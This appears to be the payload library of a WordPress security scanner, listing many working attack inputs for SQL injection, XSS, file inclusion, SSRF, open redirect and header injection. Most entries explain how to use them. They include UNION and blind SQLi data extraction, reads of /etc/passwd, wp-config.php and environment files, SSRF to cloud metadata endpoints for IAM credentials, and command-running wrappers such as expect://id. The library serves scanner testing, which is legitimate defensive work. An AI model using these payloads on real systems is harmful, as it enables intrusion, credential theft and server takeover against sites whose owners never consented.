_meta: Curated read-only payload library for the Payload Tester. Every entry must have read_only=true; the loader rejects anything else. Categories: sqli, xss, lfi, ssrf, open_redirect, header_injection.

payloads.title: Naked single quote
payloads.description: Most basic SQLi probe. An unbalanced single quote will cause a MySQL syntax error if the parameter is concatenated unsafely.

detect.match_value: You have an error in your SQL syntax

payloads.title: Naked double quote
payloads.description: Double-quote variant — catches code that uses "..." string delimiters.

detect.match_value: You have an error in your SQL syntax

payloads.title: Closing paren + quote
payloads.description: Catches queries like WHERE id = ('1') where you need to close the paren as well.

detect.match_value: You have an error in your SQL syntax

payloads.title: Classic OR 1=1 truthy
payloads.description: If injection works, this turns the WHERE clause into a tautology — the response should match more rows than baseline.

payloads.title: Boolean truthy with line comment
payloads.description: ' AND 1=1-- - (everything after -- is ignored). Comparing to the falsy variant length distinguishes injection from noise.

payloads.title: Boolean falsy with line comment
payloads.description: ' AND 1=2-- - — pair with the truthy variant above; length delta proves boolean injection.

payloads.title: UNION SELECT NULL (1 column)
payloads.description: Probes column count. Increase NULL count by one each try until error goes away — that's your column count.

detect.match_value: The used SELECT statements have a different number of columns

payloads.title: UNION SELECT NULL,NULL,NULL (3 columns)
payloads.description: Typical WordPress queries have 3-5 columns. If this returns 200 instead of an error, the column count is 3.

payloads.title: Time-based SLEEP(3)
payloads.description: ' AND SLEEP(3)-- - — if the response takes ~3s longer than baseline, the DB is executing attacker SQL.

payloads.title: Time-based via BENCHMARK
payloads.description: Alternative time-based that doesn't use SLEEP — useful when SLEEP() is denied by sql_mode or WAF.

payloads.title: Error-based extractvalue() version dump
payloads.description: Forces an XPath error that includes the result of the inner SELECT — typically used to extract version().

payloads.title: Error-based updatexml() version dump
payloads.description: Like extractvalue but using updatexml() — works on MySQL versions where extractvalue is filtered.

payloads.title: MSSQL time-based WAITFOR DELAY
payloads.description: For sites backed by MS SQL Server (rare in WP but seen in plugins that integrate with Windows stacks).

payloads.title: WAF bypass via inline comment
payloads.description: /**/ between keywords. Many WAFs miss this. Otherwise identical to the OR 1=1 case.

payloads.title: WAF bypass via mixed case
payloads.description: Mixed case keywords — older WAFs only match exact case.

payloads.title: Basic <script> tag
payloads.description: The textbook XSS payload. Triggers an alert when reflected in HTML body context.

payloads.title: img onerror
payloads.description: — bypasses many filters that block

payloads.title: svg onload
payloads.description: <svg onload=alert(1)> — works when img/script are filtered.

payloads.title: Attribute-break out
payloads.description: Escapes a double-quoted attribute then injects an event handler. Use when reflection lands inside attr="...".

payloads.title: Attribute-break (single quote)
payloads.description: Same as above for attr='...' contexts.

payloads.title: javascript: scheme in href
payloads.description: For URL contexts (href=, src=, action=). javascript:alert(1)

payloads.title: body onload
payloads.description: <body onload=alert(1)> — works in body-tag injection contexts.

payloads.title: Input autofocus + onfocus
payloads.description: <input onfocus=alert(1) autofocus> — fires without user interaction.

payloads.title: details ontoggle
payloads.description: <details ontoggle=alert(1) open> — uncommon enough to bypass naive denylists.

payloads.title: iframe srcdoc
payloads.description: <iframe srcdoc='<script>alert(1)</script>'> — bypasses some CSPs that allow iframes.

payloads.title: math href
payloads.description: <math href=javascript:alert(1)>x</math> — works when <a> tags are filtered.

payloads.title: Angular template injection
payloads.description: {{constructor.constructor('alert(1)')()}} — fires in Angular contexts that interpret double-curly as template syntax.

payloads.title: Vue mustache
payloads.description: {{ '' . constructor . constructor('alert(1)')() }} — Vue.js variant.

payloads.title: XSS polyglot (works across many contexts)
payloads.description: A single payload designed to fire in HTML, attribute, JS, and URL contexts simultaneously.

payloads.title: svg script
payloads.description: <svg><script>alert(1)</script></svg> — bypasses naive <script> filters in some contexts.

payloads.title: /etc/passwd via shallow traversal
payloads.description: ../../etc/passwd — works when the vulnerable file handler is 2 directories deep from /.

payloads.title: /etc/passwd via deep traversal
payloads.description: Six levels up — covers most plugin file handlers which typically live deep under wp-content/.

payloads.title: Double-URL-encoded traversal
payloads.description: %252e%252e%252fetc/passwd — bypasses naive URL-decoding filters.

payloads.title: Overlapping path traversal
payloads.description: ....//....// — bypasses filters that strip ../ once.

payloads.title: Null-byte truncation (PHP < 5.3.4)
payloads.description: %00 truncates the string in old PHP. Only works against legacy installs.

payloads.title: PHP filter base64 (read PHP source)
payloads.description: php://filter/convert.base64-encode/resource=index.php — reads PHP source as base64 instead of executing it.

payloads.title: PHP filter base64 of wp-config
payloads.description: Reads wp-config.php as base64. Will reveal DB credentials if it works.

payloads.title: file:// scheme
payloads.description: file:///etc/passwd — works against URL-fetch contexts (oEmbed, plugin URL handlers).

payloads.title: Windows win.ini
payloads.description: For Windows-hosted WordPress. ../../../../Windows/win.ini

payloads.title: Absolute path (no traversal)
payloads.description: /etc/passwd as an absolute path — works when the handler doesn't constrain the path root.

payloads.title: http://127.0.0.1/
payloads.description: Most basic SSRF probe. If the response contains an Apache/Nginx default page, the SSRF endpoint reached localhost.

payloads.title: http://[::1]/
payloads.description: IPv6 loopback. Some IP allowlists block 127.0.0.1 but forget [::1].

payloads.title: SSH banner via localhost:22
payloads.description: http://127.0.0.1:22/ — typically returns an SSH-2.0 banner in the error/response body.

payloads.title: Redis localhost (banner check)
payloads.description: http://127.0.0.1:6379/ — Redis responds with a parser error containing 'WRONGTYPE' or similar.

payloads.title: Internal RFC1918 address
payloads.description: http://10.0.0.1/ — typical internal gateway. Confirms SSRF can reach private network.

payloads.title: 192.168/16 gateway
payloads.description: http://192.168.1.1/ — another common internal address.

payloads.title: AWS metadata service
payloads.description: RED FLAG: http://169.254.169.254/latest/meta-data/ — on AWS EC2, this returns IAM credentials. Equivalent endpoints exist for GCP / Azure / DigitalOcean.

payloads.title: GCP metadata service
payloads.description: RED FLAG: GCP equivalent of the AWS metadata SSRF. Requires Metadata-Flavor header in real exploitation.

payloads.title: http://127.0.0.1/wp-cron.php?doing_wp_cron
payloads.description: Reach the site's own wp-cron via SSRF — bypasses any external auth on cron.

payloads.title: DNS rebinding hostname
payloads.description: http://make-this-resolve-to-127.0.0.1.attacker.example.invalid/ — bypasses string-based SSRF filters that block '127.0.0.1' literal.

payloads.title: Direct https:// to evil
payloads.description: https://wpsecscan-redirect-test.invalid/landed — does the redirect parameter follow off-host URLs?

payloads.title: Protocol-relative //evil
payloads.description: //wpsecscan-redirect-test.invalid — the lack of explicit scheme bypasses naive 'starts with http' filters.

payloads.title: Backslash variant
payloads.description: /\wpsecscan-redirect-test.invalid — some URL parsers treat \ as / .

payloads.title: @-confusion in URL
payloads.description: https://target.com@evil/ — the user-info portion fools some URL parsers into using the @ as authority delimiter.

payloads.title: URL-encoded slash
payloads.description: https://wpsecscan-redirect-test.invalid%2F — bypasses filters that look for unencoded /.

payloads.title: Mixed slashes
payloads.description: /\/wpsecscan-redirect-test.invalid — combines tricks.

payloads.title: Unicode whitespace prefix
payloads.description: Whitespace before the URL — some parsers strip it but the resulting host is attacker-controlled.

payloads.title: Newline in redirect param
payloads.description: Embedded \r\n — may inject a header.

payloads.title: data: URI
payloads.description: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== — some open-redirect handlers will Location: this back to the browser, executing JS.

payloads.title: javascript: scheme
payloads.description: Some apps redirect to javascript: URIs — browser will execute the JS.

payloads.title: X-Forwarded-For: 127.0.0.1
payloads.description: Spoof source IP to localhost. Many apps trust XFF for IP allowlists.

payloads.title: X-Forwarded-For: 10.0.0.1
payloads.description: Spoof source IP to internal network. Useful when admin panels trust LAN-source headers.

payloads.title: Host: evil.example.invalid
payloads.description: Replace Host header — exposes password-reset link poisoning and cache poisoning.

payloads.title: X-Forwarded-Host: evil
payloads.description: Many WordPress plugins use X-Forwarded-Host to construct URLs (password resets, etc.). Spoofing it can poison those URLs.

payloads.title: X-Original-URL bypass
payloads.description: Some reverse proxies forward this header to the backend, which may rewrite the request path. Try X-Original-URL: /wp-admin/ to bypass front-end ACLs.

payloads.title: X-Rewrite-URL bypass
payloads.description: Same as X-Original-URL — variant header name. Some setups respect one but not the other.

payloads.title: X-HTTP-Method-Override: PUT
payloads.description: Some frameworks let HTTP method be overridden via this header — useful for sending PUT/DELETE through a GET-only proxy.

payloads.title: True-Client-IP spoof
payloads.description: Akamai-style alternate to X-Forwarded-For.

payloads.title: Forwarded: for=127.0.0.1
payloads.description: RFC 7239 standard form of XFF.

payloads.title: X-Cluster-Client-IP
payloads.description: Header used by some load-balancers; spoofing it can trick rate-limiters and IP allowlists.

payloads.title: PostgreSQL pg_sleep time-based
payloads.description: For sites backed by Postgres (a few WP plugins integrate with PG via plugins like 'pg-meta'). Different syntax than MySQL.

payloads.title: SQLite randomblob heavy compute
payloads.description: SQLite doesn't have SLEEP; randomblob(100000000) takes a few seconds and works as a time oracle.

payloads.title: Second-order SQLi marker
payloads.description: Stores a marker that's later interpolated unsafely. Detection takes a second request — see the payload tester's manual flow.

payloads.title: Stacked-query bypass via comment
payloads.description: Some sanitizers strip the keyword AFTER decoding; nested comments survive that.

payloads.title: UTF-8 multibyte bypass (mysql_real_escape_string)
payloads.description: Multibyte payloads bypass mysql_real_escape_string on misconfigured connections (latin1 + UTF-8 client).

payloads.title: SVG with explicit namespace
payloads.description: <svg xmlns="http://www.w3.org/2000/svg" onload=alert(1)/> — bypasses naive 'no svg' filters.

payloads.title: HTML entity in script
payloads.description: <script>alert(1)</script> — entities decoded server-side that survive into HTML.

payloads.title: CSP bypass via JSONP source
payloads.description: Many CSPs allow common CDNs that host JSONP endpoints; an injected <script src=...> there bypasses.

payloads.title: MathML mtext
HTML-comment break-out
payloads.description: --><svg onload=alert(1)> — break out of <!-- ... --> contexts where user input lands.

payloads.title: data:// URI source
payloads.description: data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== — some PHP plugins blindly include() user-supplied URI schemes.

payloads.title: expect:// wrapper (PECL expect extension)
payloads.description: expect://id — runs OS commands if the expect extension is loaded. Rare but devastating.

payloads.title: zip:// wrapper
payloads.description: zip://%2Ftmp%2Ffoo.zip%23payload.php — reads a file from inside a zip the attacker uploaded.

payloads.title: Windows env variables in path
payloads.description: %USERPROFILE%/Desktop/wp-config.php — some Windows-hosted WP installs expand env vars.

payloads.title: Azure Instance Metadata Service
payloads.description: RED FLAG: http://169.254.169.254/metadata/instance?api-version=2021-02-01 — Azure equivalent of AWS metadata. Requires 'Metadata: true' header in real exploitation.

payloads.title: Kubernetes API server
payloads.description: http://10.0.0.1:6443/api/ or kubernetes.default.svc.cluster.local — for containers that share the cluster network.

payloads.title: gopher://redis (read-only INFO)
payloads.description: gopher://127.0.0.1:6379/_INFO%0d%0aQUIT — Redis INFO is read-only. Tests reachability without exposing the database to writes.

payloads.title: AWS IAM role credentials
payloads.description: RED FLAG: http://169.254.169.254/latest/meta-data/iam/security-credentials/ — lists IAM roles; following the role name returns temporary credentials.

payloads.title: CRLF injection in redirect
payloads.description: Embedded \r\n in the redirect param can inject arbitrary response headers (cache poisoning).

payloads.title: Fragment trick
payloads.description: https://yoursite.com#@wpsecscan-redirect-test.invalid/ — fragment isn't sent in HTTP; some allowlist parsers stop at #.

payloads.title: Cache key poison via X-Forwarded-Host
payloads.description: X-Forwarded-Host: evil.example.com — some CDN caches use the requested Host as the cache key; poisoning it lets you serve content under another origin.

payloads.title: Host override for password-reset link
payloads.description: Many WP installs use the Host header (or X-Forwarded-Host) to build absolute URLs in password-reset emails. Poisoning that header redirects reset tokens to the attacker.

payloads.title: HTTP/2 CRLF smuggling probe
payloads.description: Some HTTP/2-to-HTTP/1.1 downgraders permit \r\n in header values, allowing request smuggling.

payloads.title: Via header inspection
payloads.description: Some apps log/echo the Via: header. Useful for identifying proxy chains.

payloads.title: X-Forwarded-Server SSRF probe
payloads.description: Some apps use X-Forwarded-Server to construct outbound URLs for webhooks. Spoof it to a private IP.

payloads.title: Oracle DUAL table
payloads.description: ' UNION SELECT NULL FROM dual-- - for Oracle backends (some WP plugins integrate with Oracle).

payloads.title: NoSQL $ne operator
payloads.description: For MongoDB-backed WP plugins (rare but exist). {$ne: ''} bypasses string comparison.

payloads.title: NoSQL $regex operator
payloads.description: For MongoDB-backed plugins — regex bypass: ?username[$regex]=.*

payloads.title: PostgreSQL string concat ||
payloads.description: ||(SELECT version()) — Postgres concat operator, useful for blind extraction.

payloads.title: SQLi via Cookie header
payloads.description: Some WP plugins use cookie values in queries. Send the SQLi via Cookie: instead of URL param. (Use header_injection field in the tester.)

detect.match_value: You have an error in your SQL syntax

payloads.title: marquee onstart
payloads.description: <marquee onstart=alert(1)> — obsolete-but-still-parsed tag, often missed by filters.

payloads.title: dialog tag open
payloads.description: <dialog open onclose=alert(1)> — HTML5 dialog element.

payloads.title: javascript: in img srcset
payloads.description: — some legacy browsers honor srcset URI schemes.

payloads.title: postMessage source injection
payloads.description: For sites that listen on window.postMessage without checking origin. Tester records reflection only — exploitation requires a separate page.

payloads.title: svg animate onbegin
payloads.description: <svg><animate onbegin=alert(1) attributeName=x></svg> — SMIL animation event handler.

payloads.title: PHAR deserialization trigger
payloads.description: phar:///tmp/foo.phar/inner — triggers PHP object deserialization if a file_get_contents-style call meets attacker-controlled path. Read-only side: file_exists() also triggers.

payloads.title: Log poisoning baseline (read /var/log/apache2/access.log)
payloads.description: If LFI can read access.log, attacker can poison it via User-Agent and gain code execution. We just read the log here.

payloads.title: compress.zlib:// wrapper
payloads.description: compress.zlib:///path/to/file — PHP zlib stream wrapper; useful for reading gzipped log files or evading filters.

payloads.title: Docker daemon via TCP
payloads.description: http://127.0.0.1:2375/version — docker daemon bound to TCP grants container creation = container escape = host RCE.

payloads.title: Consul agent
payloads.description: http://127.0.0.1:8500/v1/agent/self — Consul service discovery; access can leak service tokens.

payloads.title: etcd cluster
payloads.description: http://127.0.0.1:2379/v2/keys — etcd key-value store; access can leak the entire config of clustered apps.

payloads.title: WebSocket Upgrade smuggling probe
payloads.description: Sending Upgrade: websocket on a normal HTTP request can desync some HTTP/2-to-HTTP/1.1 proxies, enabling request smuggling.

payloads.title: X-Original-Method override
payloads.description: X-Original-Method: PUT — some reverse-proxy + framework combos honor this, allowing PUT/DELETE via GET.

payloads.title: Transfer-Encoding: chunked smuggling probe
payloads.description: Sending TE: chunked + CL: <num> together is the classic CL.TE smuggling setup. Detection: does the server respond at all when we send a malformed body? (We don't actually smuggle.)

payloads.title: Range request with crafted byte range
payloads.description: Range: bytes=0-,5-,10-,... — historic Apache memory disclosure (CVE-2011-3192) and modern variants.

payloads.title: Blind SQLi via SUBSTRING + IF
payloads.description: ' AND IF(SUBSTRING(version(),1,1)='8',SLEEP(2),0)-- - extracts version one character at a time.

payloads.title: ORDER BY column-count probe
payloads.description: ?orderby=1, ?orderby=999 — error vs no-error distinguishes column count.

payloads.title: MSSQL CAST error-based
payloads.description: ' AND 1=CONVERT(int,@@version)-- - throws an error containing @@version on MS SQL Server.

payloads.title: SQLi via hex encoding (no quotes)
payloads.description: 0x61 = 'a'. Useful when single-quote chars are filtered.

payloads.title: SQL truncation attack
payloads.description: Username with trailing whitespace + payload may collide with existing user on insert due to column truncation.

payloads.title: image-set in CSS
payloads.description: — CSS-context XSS via image-set.

payloads.title: <base> tag hijack
payloads.description: <base href=//evil.example.invalid/> — changes the page's resolved URLs; subsequent same-origin requests go to attacker.

payloads.title: meta refresh to data: URL
payloads.description: <meta http-equiv=refresh content='0;url=data:text/html,<script>alert(1)</script>'>

payloads.title: CSS expression() (legacy IE)
payloads.description: <div style="width:expression(alert(1))"> — only runs in old IE but still seen on legacy WP sites.

payloads.title: <link rel=import>
payloads.description: <link rel=import href=//evil/> — Chrome legacy HTML imports; rare today.

payloads.title: jar:// wrapper (rare)
payloads.description: jar:http://evil/foo.jar!/x - alternative wrapper for JAR-aware PHP setups.

payloads.title: Glob wildcard path
payloads.description: ../../*/wp-config.php — some plugins use glob() and accept * in user input.

payloads.title: /proc/self/environ read
payloads.description: /proc/self/environ — exposes env vars (DB credentials, AWS keys) on misconfigured PHP-FPM.

payloads.title: Windows hosts file
payloads.description: C:/Windows/System32/drivers/etc/hosts

payloads.title: AWS IMDSv2 token request
payloads.description: IMDSv2 requires a PUT to /latest/api/token first. Send the GET anyway — if the server isn't using IMDSv2 enforcement, this reveals IMDSv1 still works.

payloads.title: DNS-over-HTTPS provider via SSRF
payloads.description: https://cloudflare-dns.com/dns-query?name=example.com&type=A — useful to confirm SSRF can reach arbitrary HTTPS hosts.

payloads.title: AWS metadata via X-Forwarded-For
payloads.description: Some app servers blindly use X-Forwarded-For as the SSRF target. Header rather than URL.

payloads.title: Mixed-case scheme bypass
payloads.description: Some validators only block lowercase 'https://'. hTtPs://evil/ bypasses.

payloads.title: Unicode dot in hostname
payloads.description: https://example.com\u3002wpsecscan-redirect-test.invalid — Unicode fullwidth period normalizes to .

payloads.title: Double URL-encoded slash
payloads.description: https:%252F%252Fwpsecscan-redirect-test.invalid — //% decoded twice = //.

payloads.title: X-Forwarded-Proto downgrade
payloads.description: X-Forwarded-Proto: http — some apps trust this for HTTPS detection; downgrade attacks may issue cleartext cookies.

payloads.title: X-Forwarded-Port spoof
payloads.description: X-Forwarded-Port: 80 — combined with proto, can bypass HSTS checks in some apps.

payloads.title: Vary header poisoning probe
payloads.description: Send Accept-Encoding: very-unusual — some caches key by Accept-Encoding; mismatches bypass cache and amplify load.

payloads.title: Content-Type confusion
payloads.description: Set Content-Type: application/json on a normally-form-encoded endpoint. Some plugins skip CSRF nonce checks when CT is JSON.

payloads.title: X-Original-URL ACL bypass (deep)
payloads.description: X-Original-URL: /wp-admin/options.php — some reverse proxies rewrite based on this header but the backend may still trust it for ACLs.

payloads.title: Newline-comment WAF bypass
payloads.description: '%0AOR%0A1=1-- - splits the OR onto its own line. Some WAFs only match whitespace-separated keywords.

payloads.title: Tab-separator WAF bypass
payloads.description: '%09OR%091=1-- - uses tab whitespace.

payloads.title: Percent-encoded keyword
payloads.description: %53ELECT bypasses keyword filters that don't decode percent first.

payloads.title: INFORMATION_SCHEMA extraction
payloads.description: ' UNION SELECT 1,table_name FROM information_schema.tables-- - lists DB tables once column count is known.

payloads.title: SQLi via accept-language
payloads.description: Many WP plugins use Accept-Language for localization queries — try injection there. (Use header_injection field in tester.)

detect.match_value: You have an error in your SQL syntax

payloads.title: Form action javascript:
payloads.description: <form action=javascript:alert(1)><input type=submit></form> — fires on submit.

payloads.title: svg <set> animation
payloads.description: <svg><set attributeName=onmouseover to=alert(1)></set></svg>

payloads.title: onpointerdown event
payloads.description:
x
— pointer events are often missed by event-handler filters.

payloads.title: onfocusin event
payloads.description:
x
— focusin bubbles, fires on tab.

payloads.title: Stored-XSS marker
payloads.description: Insert a unique marker that should survive a refresh if stored. The tester only sends; verify reflection on the *next* page load yourself.

payloads.title: php://input wrapper
payloads.description: php://input reads the raw POST body. Useful for RFI-via-include vulnerabilities.

payloads.title: php://temp wrapper
payloads.description: php://temp/maxmemory:0 — combined with POST body sometimes enables include of attacker input.

payloads.title: RFC1738 file:// with host
payloads.description: file://localhost/etc/passwd — host portion may bypass strict-file filters.

payloads.title: Link-local 169.254.x
payloads.description: http://169.254.0.1/ — link-local address space; sometimes routable inside corp networks.

payloads.title: Multicast group
payloads.description: http://239.255.255.250:1900/ — UPnP SSDP multicast.

payloads.title: AWS IAM role specific creds
payloads.description: http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> — after listing roles, fetch the role's temporary credentials.

payloads.title: User-info with @
payloads.description: https://user:pass@target.com — userinfo portion may fool parser.

payloads.title: Tab character bypass
payloads.description: https://\tevil.example.invalid/ — leading tab is sometimes stripped after the host check.

payloads.title: Carriage-return bypass
payloads.description: Trailing %0D (CR) may be stripped after parser checks but before redirect dispatch.

payloads.title: X-Original-Method ACL skip
payloads.description: X-Original-Method: GET on a POST endpoint — some apps use this to set the 'effective' method for ACL checks.

payloads.title: Akamai cache-key poisoning
payloads.description: Akamai supports cache-key segmentation via X-Akamai-* headers; spoofing one may shard cache or leak.

payloads.title: CF-Connecting-IP spoof
payloads.description: Cloudflare ships the original client IP in CF-Connecting-IP; spoofing it tricks origin apps that trust this header.

payloads.title: CDN-Loop header probe
payloads.description: CDN-Loop: probe — Cloudflare uses this to detect loops; abused it can falsify path metadata.

payloads.title: True-Host header
payloads.description: Some hosting CDNs honor True-Host: as an override for routing. Spoof to a different vhost.

payloads.title: X-Cluster-Token probe
payloads.description: Some load balancers honor a per-cluster token header; spoofing may bypass auth at the LB layer.

payloads.title: MSSQL system_user
payloads.description: ' UNION SELECT system_user-- - on MS SQL returns the current login user.

payloads.title: PostgreSQL version()
payloads.description: ' UNION SELECT version()-- - returns Postgres version banner.

payloads.title: Blind boolean via ASCII
payloads.description: ' AND ASCII(SUBSTRING(version(),1,1))=56-- - tests if first char of version is '8'.

payloads.title: CHAR() bypass
payloads.description: ' AND 1=CHAR(49)-- - uses CHAR() to avoid quote chars in the payload.

payloads.title: Conditional error-based
payloads.description: ' AND IF(version() LIKE '8%', (SELECT 1 UNION SELECT 2), 0)-- - forces an error only for matching condition.

payloads.title: PostgreSQL pg_class enumeration
payloads.description: ' UNION SELECT relname FROM pg_class-- - lists Postgres tables.

payloads.title: iframe onload
payloads.description: <iframe src=about:blank onload=alert(1)>

payloads.title: isindex with action
payloads.description: <isindex action=javascript:alert(1) type=submit>

payloads.title: template tag with script
payloads.description: <template><script>alert(1)</script></template> — content inside <template> is parsed but not rendered, surprising some filters.

payloads.title: textarea break-out
payloads.description: </textarea><script>alert(1)</script><textarea> — escapes textarea contexts.

payloads.title: style break-out
payloads.description: </style><script>alert(1)</script><style> — escapes <style> contexts.

payloads.title: xmp break-out
payloads.description: </xmp><script>alert(1)</script><xmp> — xmp is preformatted text; rarely filtered.

payloads.title: UTF-8 overlong encoding bypass
payloads.description: %c0%2e%c0%2e/ — overlong UTF-8 for '..' — bypasses naive ASCII-only path checks.

payloads.title: Windows file with overlong dots
payloads.description: ....\....\Windows\win.ini

payloads.title: DNS rebinding service
payloads.description: http://1.1.1.1.nip.io/ — nip.io resolves arbitrary IPs from hostnames; useful when target whitelists by hostname.

payloads.title: IPv4 decimal notation
payloads.description: http://2130706433/ = 127.0.0.1 in decimal. Bypasses string-based 127.0.0.1 blocklists.

payloads.title: Redis on default port
payloads.description: redis://127.0.0.1:6379 — bypasses HTTP-only SSRF filters that don't see other schemes.

payloads.title: FTP scheme SSRF
payloads.description: ftp://127.0.0.1/ — useful when only http:// is filtered.

payloads.title: Cyrillic look-alike host
payloads.description: https://wрsесsсan-rеdirесt.invalid — homoglyph attack with Cyrillic letters that look like Latin.

payloads.title: Triple slash
payloads.description: https:///wpsecscan-redirect-test.invalid/ — three slashes; some parsers treat empty authority as localhost.

payloads.title: Port-confusion
payloads.description: https://target.com:443.evil/ — looks like port spec but eval'd hostname is 443.evil.

payloads.title: X-CSRF-Token spoofing
payloads.description: Send a fake X-CSRF-Token — some apps accept any non-empty value.

payloads.title: X-Requested-With bypass
payloads.description: X-Requested-With: XMLHttpRequest — some CSRF checks rely on this header alone. Setting it disables that check.

payloads.title: X-Frame-Options override probe
payloads.description: Some apps echo back X-Frame-Options from a custom header.

payloads.title: Via header loop probe
payloads.description: Via: 1.1 wpsecscan-loop, 1.1 wpsecscan-loop — duplicate Via headers may confuse loop detection.

payloads.title: Negative Content-Length
payloads.description: Content-Length: -1 — some servers crash or reveal info.

payloads.title: Newline-stacked query
payloads.description: ';\nSELECT 1-- — some PHP DB adapters tolerate newline as a statement separator on certain drivers.

detect.match_value: You have an error in your SQL syntax

payloads.title: MongoDB $where injection
payloads.description: ';return true;' — for MongoDB-backed WP plugins (rare). Bypass auth in find() with where-clauses.

payloads.title: ClickHouse FORMAT JSON
payloads.description: ' UNION SELECT 1 FORMAT JSON-- — ClickHouse formats results as JSON; useful for confirming OS-level connections.

payloads.title: NoSQL JSON-body operator
payloads.description: {"$ne": null} as a JSON body — bypasses string-equality checks on JSON-input fields.

payloads.title: Type-juggling 9e9999
payloads.description: id=9e9999 — exponent notation crashes some DB drivers or returns to a default row.

payloads.title: Web component attribute injection
payloads.description: <wpsx-custom data-x="</wpsx-custom><script>alert(1)</script>">

payloads.title: link rel=stylesheet with SVG
payloads.description: <link rel=stylesheet href=javascript:alert(1)> — historic IE behavior; still works in some embedded browsers.

payloads.title: CSS background: data:
payloads.description: <div style="background:url(data:text/html,<script>alert(1)</script>)">

payloads.title: React dangerouslySetInnerHTML marker
payloads.description: Look for {"__html":"..."} JSON in source — indicates dangerouslySetInnerHTML usage worth auditing.

payloads.title: Mutation observer trigger
payloads.description: <x-y onfocus=alert(1) tabindex=0 autofocus> — custom-element + autofocus triggers without click.

payloads.title: expect:// with id command
payloads.description: expect://id — runs /usr/bin/id via PECL expect extension (rare). Returns uid/gid as output.

payloads.title: glob:// wildcard
payloads.description: glob:///etc/* — PHP glob wrapper enumerates files.

payloads.title: ssh2.exec://
payloads.description: ssh2.exec://user:pass@host/command — runs commands via PECL ssh2 if loaded.

payloads.title: ZIP slip via path
payloads.description: Filenames containing ../../ inside a ZIP upload trick the extractor into writing outside the target dir.

payloads.title: AWS ECS task metadata
payloads.description: http://169.254.170.2/v2/credentials — AWS ECS/Fargate task IAM credentials endpoint.

payloads.title: DigitalOcean droplet metadata
payloads.description: http://169.254.169.254/metadata/v1/ — DigitalOcean droplet info (no auth required).

payloads.title: Alibaba Cloud metadata
payloads.description: http://100.100.100.200/latest/meta-data/ — Alibaba ECS metadata endpoint.

payloads.title: Hetzner Cloud metadata
payloads.description: http://169.254.169.254/hetzner/v1/metadata — Hetzner cloud server metadata.

payloads.title: IPv6 mapped IPv4
payloads.description: http://[::ffff:127.0.0.1]/ — IPv6-mapped IPv4 form of localhost; bypasses string blocklists.

payloads.title: Chained Location via WPGraphQL
payloads.description: https://target/?redirect_to=//evil/ inside a GraphQL persistedQueries response — chained redirects are common in WP API flows.

payloads.title: ..%2F mid-URL
payloads.description: https://target.com..%2Fwpsecscan-redirect-test.invalid — some parsers normalize ..%2F into traversal that escapes the host.

payloads.title: IDN punycode
payloads.description: https://xn--80ak6aa92e.invalid/ — Cyrillic 'аррӏе' in punycode form.

payloads.title: Leading whitespace bypass
payloads.description: https://wpsecscan-redirect-test.invalid/ — leading space stripped by Location header parser; passes string-prefix host check.

payloads.title: HTTP/2 :method pseudo-header smuggling
payloads.description: :method: GET — sending pseudo-headers through an HTTP/1.1 client may smuggle to HTTP/2 upstream.

payloads.title: X-HTTP-Method header
payloads.description: X-HTTP-Method: DELETE — older spring/jaxrs frameworks honor this for method override.

payloads.title: X-Method-Override header
payloads.description: X-Method-Override: PUT — Rails/Express honor this.

payloads.title: X-Tunneled-Method
payloads.description: Another method-override variant used by some old Java frameworks.

payloads.title: CRLF in Cookie header
payloads.description: Cookie: wpsx=1\r\nInjected: 1 — try CRLF injection in cookie value.

payloads.title: X-Wap-Profile SSRF
payloads.description: X-Wap-Profile: http://wpsx/ — some legacy WAP gateways fetch this URL, becoming an SSRF source.

payloads.title: X-Real-IP spoof
payloads.description: X-Real-IP: 127.0.0.1 — Nginx's standard real-ip header; spoofing it bypasses IP allowlists.
